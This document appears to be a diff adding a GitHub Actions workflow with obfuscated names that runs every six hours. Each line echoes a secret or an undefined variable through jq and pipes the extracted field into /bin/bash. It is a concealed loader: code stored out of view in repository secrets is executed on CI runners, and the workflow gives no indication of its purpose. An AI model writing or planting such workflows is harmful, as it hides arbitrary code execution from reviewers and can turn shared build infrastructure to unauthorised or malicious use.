@@ -1,0 +1,21 @@
+name: youjinfenzhong
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '20 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: youjinfenzhong
+        env:
+          pa071: ${{ secrets.pa071 }}
+        run: |
+          echo $pa071 | jq -r .h4656 | /bin/bash
+          echo $o45 | jq -r .knd8505 | /bin/bash
+          echo $ybviq24 | jq -r .uz002 | /bin/bash
+          echo $g83 | jq -r .cqimd3 | /bin/bash
+          echo $q0713 | jq -r .v69 | /bin/bash
+
